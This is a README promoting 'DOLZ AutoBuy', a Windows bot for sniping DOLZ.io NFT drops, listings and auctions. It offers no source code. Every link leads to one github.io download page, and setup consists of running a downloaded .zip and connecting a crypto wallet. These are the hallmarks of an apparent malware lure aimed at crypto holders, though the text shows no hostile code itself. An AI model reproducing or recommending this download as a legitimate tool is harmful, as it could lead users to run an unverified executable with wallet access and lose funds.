# DOLZ AutoBuy

<p align="center">
  <strong>Automated DOLZ Drops & NFT Marketplace Assistant</strong>
</p>

<p align="center">
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/GET%20DOLZ%20AUTOBUY-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="Get DOLZ AutoBuy">
  </a>
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/MINT%20SNIPER-EXPERIMENTAL-8b5cf6?style=for-the-badge" alt="Mint Sniper Experimental">
  </a>
</p>

<p align="center">
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/POLYGON-✓-2ea44f?style=flat-square" alt="Polygon Supported">
  </a>
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/DOLZ%20DROPS-✓-2ea44f?style=flat-square" alt="DOLZ Drops Supported">
  </a>
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/MARKETPLACE-✓-2ea44f?style=flat-square" alt="Marketplace Supported">
  </a>
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/AUCTIONS-✓-2ea44f?style=flat-square" alt="Auctions Supported">
  </a>
</p>

<p align="center">
  <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/1.png?raw=true" width="46%" alt="DOLZ AutoBuy Interface">
  <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/2.png?raw=true" width="46%" alt="DOLZ AutoBuy Interface">
</p>

---

## Overview

DOLZ AutoBuy is a desktop automation assistant built specifically around the DOLZ.io collectible ecosystem.

It is designed for collectors who want to monitor DOLZ Drops, track marketplace activity, follow collection releases, and manage predefined purchase conditions from one interface instead of constantly checking the DOLZ website manually.

The application focuses on three main workflows:

- Monitoring upcoming and active DOLZ Drops
- Watching secondary-market NFT listings
- Tracking supported auction activity

DOLZ.io currently exposes dedicated areas for Drops, Marketplace, Rewards, $DOLZ, Bridge, and wallet profiles. Wallet profiles can include trading-card ownership, estimated collection value, BabyDOLZ balance, rewards, season progress, and rarity distribution. DOLZ's ecosystem also includes adult collectible cards and other NFT categories.

---

## What DOLZ AutoBuy Does

DOLZ AutoBuy connects the DOLZ collecting workflow with configurable automation rules.

Instead of reacting manually to every new listing or drop, the user defines what should be monitored and what conditions must be satisfied before an automated action is attempted.

The application can be organized around:

| Module | Purpose |
|:--|:--|
| **Drops Monitor** | Watches DOLZ Drops and release states. |
| **Mint Sniper** | Experimental monitoring and automated mint workflow. |
| **Marketplace AutoBuy** | Searches supported marketplace listings using user-defined conditions. |
| **Auction Monitor** | Tracks supported DOLZ auction activity and bid conditions. |
| **Collection Scanner** | Analyzes selected collections, seasons, rarity and metadata. |
| **Wallet Monitor** | Tracks wallet activity and transaction status. |
| **Activity Log** | Keeps a local history of monitoring events and actions. |
| **Notifications** | Sends optional alerts when configured conditions are triggered. |

---

## Drops Monitor

The **Drops Monitor** is the main module for following DOLZ releases.

It can display upcoming, active, and completed drops and continuously check the selected release for changes.

### Drop Tracking

- Upcoming drop detection
- Active mint detection
- Release countdown
- Drop status monitoring
- Collection identification
- Season information
- Mint availability checks
- Configurable refresh interval
- Local event history

The interface can highlight a drop as **Coming**, **Live**, **Sold Out**, or **Ended**, depending on the information available from the monitored DOLZ source.

---

## Mint Sniper

The **Mint Sniper** is an experimental module for users who want to automate their response to a DOLZ Drop becoming available.

The user can select a target drop and define the limits that must be respected before a mint attempt is made.

### Mint Controls

| Setting | Description |
|:--|:--|
| **Target Drop** | DOLZ release selected for monitoring. |
| **Mint Quantity** | Maximum quantity to attempt. |
| **Maximum Spend** | Maximum amount allocated to the mint. |
| **Start Condition** | Determines when the automation becomes active. |
| **Retry Limit** | Limits repeated attempts after a failed transaction. |
| **Dry Run** | Simulates the workflow without submitting a live transaction. |
| **Emergency Stop** | Immediately disables the active automation. |

The Mint Sniper should be treated as experimental because drop timing, contract behavior, network congestion, transaction requirements, and availability can differ between releases.

---

## Marketplace AutoBuy

The **Marketplace AutoBuy** module is designed for secondary-market monitoring.

It continuously checks supported DOLZ listings and compares newly detected items with the user's purchase rules.

### Listing Filters

Users can define rules such as:

- Target collection
- Maximum price
- Minimum rarity
- Maximum quantity
- Season
- NFT traits
- Listing status
- Seller/listing information
- Purchase cooldown
- Total spending limit

When a listing satisfies the configured rules, the application can flag it as a match and, when live automation is enabled, attempt the configured purchase workflow.

---

## Smart Buy Rules

DOLZ AutoBuy can use several conditions at the same time instead of relying only on price.

Example:

```text
Collection = Selected DOLZ Collection
AND
Maximum Price <= 1.50 MATIC
AND
Rarity = Legendary
AND
Season = Selected Season
AND
Daily Spending Limit not exceeded
```

This allows collectors to create targeted strategies for specific DOLZ cards instead of automatically reacting to every marketplace listing.

---

## Collection Scanner

The **Collection Scanner** is designed around information available from DOLZ wallet and collection views.

It can organize information such as:

- Owned trading cards
- Estimated collection value
- Season progress
- Rarity distribution
- BabyDOLZ balance
- Accumulated rewards
- Collection completion
- Missing cards
- Recently acquired items

The scanner can help identify which DOLZ assets are already owned and which collection segments still require attention.

---

## Rarity & Season Filters

For supported collection data, AutoBuy can provide additional filtering based on rarity and season.

Example filters:

```text
Season: Season 11
Rarity: Legendary / Epic
Price: Up to configured maximum
Status: Available
Collection: Selected collection
```

This makes it possible to monitor a narrow subset of the DOLZ marketplace rather than the entire listing feed.

---

## Auction Monitor

The **Auction Monitor** follows supported DOLZ auction activity.

It can display:

- Current auction status
- Remaining time
- Current bid
- Configured maximum bid
- Target collection
- Bid eligibility
- Transaction state

The optional **Auction Sniper** workflow can evaluate the configured conditions before attempting an eligible bid.

> **Note:** Auction functionality depends on the specific DOLZ marketplace and smart-contract implementation. Not every collectible or release necessarily uses the same auction mechanism.

---

## Wallet Monitor

The **Wallet Monitor** provides a centralized view of the wallet used by the application.

Possible dashboard information includes:

- Connected wallet
- Active blockchain network
- Available balance
- Recent transactions
- Pending transactions
- Successful transactions
- Failed transactions
- NFT acquisition history
- Spending totals

The wallet monitor is intended to make automated activity easier to review without constantly switching between different pages.

---

## Spending Protection

Automated NFT purchases can be restricted using multiple limits.

### Global Limits

- Maximum transaction value
- Maximum daily spending
- Maximum number of purchases
- Maximum mint quantity
- Maximum auction bid
- Maximum retry count
- Purchase cooldown

Before a transaction is submitted, the application can validate the configured limits and cancel the action if a condition is not satisfied.

---

## Dry Run Mode

**Dry Run** allows the user to test the configured automation without submitting live blockchain transactions.

During a dry run, the application can show:

```text
LISTING DETECTED
        |
        v
FILTER MATCH
        |
        v
PRICE LIMIT PASSED
        |
        v
PURCHASE WOULD BE ATTEMPTED
        |
        v
DRY RUN — TRANSACTION NOT SENT
```

This mode is recommended for validating collection filters, price limits, mint quantities, and notification rules before enabling live automation.

---

## Notifications

DOLZ AutoBuy can provide optional notifications for important events.

Supported notification concepts include:

- New Drop detected
- Drop is live
- Mint condition matched
- Marketplace listing matched
- Purchase attempted
- Purchase completed
- Transaction failed
- Auction condition matched
- Spending limit reached
- Bot stopped

Telegram and Discord can be used as optional notification destinations where configured.

---

## Activity Dashboard

The main dashboard can provide a real-time summary of the automation state.

Example metrics:

| Metric | Example |
|:--|:--:|
| Listings Detected | 24 |
| Matching Listings | 6 |
| Purchases Completed | 3 |
| Failed Transactions | 0 |
| Drops Monitored | 4 |
| Auctions Monitored | 2 |
| Current Network | Polygon |
| Bot Status | Running |

The dashboard is intended to make the state of the automation immediately visible.

---

## Transaction Center

Every automated action can be assigned a status:

- **Detected**
- **Matched**
- **Preparing**
- **Submitted**
- **Pending**
- **Confirmed**
- **Failed**
- **Cancelled**

The transaction center can retain the timestamp, action type, target NFT, configured limit, and final result for later review.

---

## Automation Profiles

Users can save multiple configurations for different collecting strategies.

Example profiles:

### Conservative

```text
Low maximum price
Low daily spending limit
Dry Run enabled
Manual confirmation preferred
```

### Collection Hunter

```text
Specific collection
Selected seasons
Selected rarity
Higher matching priority
Marketplace monitoring enabled
```

### Drop Watcher

```text
Upcoming DOLZ Drops
Mint availability monitoring
Configured quantity
Strict maximum spend
Notifications enabled
```

Profiles make it possible to switch between different monitoring configurations without rebuilding every filter manually.

---

## Proposed Advanced Features

The following features are planned/conceptual extensions of the AutoBuy workflow and should be considered proposed functionality rather than official DOLZ.io features.

### Smart Floor Tracker

Track observed marketplace prices for a selected collection and maintain a local reference range.

### Rarity Alerts

Notify the user when a listing matching a selected rarity appears.

### Collection Completion Mode

Identify missing cards from a selected season and prioritize matching marketplace listings.

### Price History

Store observed listing prices locally to provide a basic historical price view.

### Duplicate Protection

Prevent repeated purchases of the same token or collection item when duplicate buying is disabled.

### Budget Scheduler

Allow separate spending limits for daily, weekly, or per-drop automation.

### Multi-Target Monitoring

Monitor several DOLZ collections or drops simultaneously from one dashboard.

### Rule Priority

Assign different priority levels to purchase rules so that more important collection targets are evaluated first.

---

## DOLZ-Specific Workflow

```text
DOLZ.io
   |
   +-------------------+
   |                   |
   v                   v
  DROPS            MARKETPLACE
   |                   |
   v                   v
Drop Monitor       Listing Scanner
   |                   |
   v                   v
Mint Rules          Buy Rules
   |                   |
   +---------+---------+
             |
             v
      Condition Engine
             |
             v
       Limit Validation
             |
             v
       Dry Run / Live
             |
             v
     Transaction Center
             |
             v
     Logs & Notifications
```

---

## DOLZ Ecosystem Integration

DOLZ.io currently exposes areas including **DROPS**, **Marketplace**, **Rewards**, **Buy $DOLZ**, and **Bridge**. Its wallet profile pages can show trading-card ownership, estimated value, BabyDOLZ balance, accumulated rewards, season distribution, and rarity distribution.

The broader DOLZ ecosystem also covers collectible categories such as iStripper adult trading cards, VRParadise 3D NFTs, and partner NFTs.

AutoBuy is focused specifically on the monitoring and automation layer around collectible activity; it does not represent every feature of the DOLZ platform.

---

## Network Support

The automation interface can be configured for supported blockchain networks used by the DOLZ ecosystem.

Network configuration may include:

- Network selection
- RPC endpoint
- Wallet address
- Transaction settings
- Gas configuration
- Connection status

DOLZ.io also provides bridge functionality for moving supported $DOLZ assets between networks including Ethereum, Polygon, and Base.

---

## System Requirements

| Component | Requirement |
|:--|:--|
| **Operating System** | Windows 10 / Windows 11 64-bit |
| **CPU** | Modern dual-core processor or better |
| **RAM** | 512 MB minimum |
| **Storage** | Small amount of free space for application data and logs |
| **Network** | Stable Internet connection |
| **Wallet** | Compatible blockchain wallet |
| **RPC** | Compatible RPC endpoint |

---

## Installation

### 1. Download

Download the latest version of **DOLZ AutoBuy**:

<p align="center">
  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
    <img src="https://img.shields.io/badge/DOWNLOAD%20DOLZ%20AUTOBUY-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="Download DOLZ AutoBuy">
  </a>
</p>

### 2. Extract

Extract the `.zip` archive and launch the application.

### 3. Configure Network

Select the supported network and configure the RPC endpoint.

### 4. Configure Wallet

Connect the wallet intended for the selected monitoring or transaction workflow.

### 5. Select DOLZ Targets

Choose the Drops, collections, listings, or auctions that should be monitored.

### 6. Configure Rules

Set the maximum price, mint quantity, rarity, collection, spending limits, and other applicable conditions.

### 7. Run a Dry Test

Enable **Dry Run** and verify that the application detects the intended DOLZ events correctly.

### 8. Start Automation

Enable the desired monitoring module and review the activity dashboard.

---

## Security

DOLZ AutoBuy should never require users to disclose their seed phrase or recovery phrase to the application publisher or another third party.

Use a dedicated wallet for automated activity when appropriate and keep strict spending limits enabled.

Before enabling live transactions, verify:

- Wallet address
- Network
- RPC endpoint
- Target collection
- NFT contract
- Maximum price
- Mint quantity
- Maximum bid
- Spending limits

If unexpected activity occurs, immediately stop the automation and review the wallet's transaction history.
